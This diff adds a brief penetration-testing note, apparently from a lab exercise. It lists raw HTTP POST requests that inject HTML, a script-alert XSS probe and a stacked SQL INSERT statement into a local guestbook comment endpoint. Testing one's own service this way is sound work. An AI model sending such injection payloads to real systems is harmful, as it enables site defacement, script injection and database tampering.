@@ -1,0 +1,23 @@
+Penetration testing via Guestbook comments
+
+
+using HTML:
+POST http://localhost:8188/UniProxService.svc/comment?name=Muzamil+Khan HTTP/1.0
+Host: localhost
+Content-Type:application/json
+Content-Length: 65
+"<img src=\"http://redsox.tcs.auckland.ac.nz/ups/logo.svg\">"
+
+using javascript:
+POST http://localhost:8188/UniProxService.svc/comment?name=Muzamil+Khan HTTP/1.0
+Host: localhost
+Content-Type:application/json
+Content-Length: 34
+"<script>alert(Math.PI)</script>"
+
+using SQL:
+POST http://localhost:8188/UniProxService.svc/comment?name=Muzamil+Khan HTTP/1.0
+Host: localhost
+Content-Type:application/json
+Content-Length: 59
+"com1'); INSERT INTO Comments VALUES ('name2', 'com2'); --"
